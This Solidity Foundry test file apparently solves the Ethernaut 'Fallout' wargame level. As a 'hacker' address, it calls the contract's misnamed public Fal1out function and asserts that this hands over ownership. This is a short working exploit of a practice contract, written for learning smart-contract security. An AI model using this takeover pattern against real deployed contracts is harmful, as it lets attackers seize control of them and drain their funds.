// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import {Fallout} from "../src/02_Fallout/Fallout.sol";

contract Fallback_Solutions is Test {
    Fallout falloutContract;

    address public owner;
    address public hacker;

    function setUp() public {
        owner = makeAddr("owner");
        vm.prank(owner);
        falloutContract = new Fallout();
    }

    function test_attack() public {
        hacker = makeAddr("hacker");
        vm.prank(hacker);
        falloutContract.Fal1out();
        assertEq(falloutContract.owner(), hacker, "Hack failed: Hacker is not the owner");
    }
}
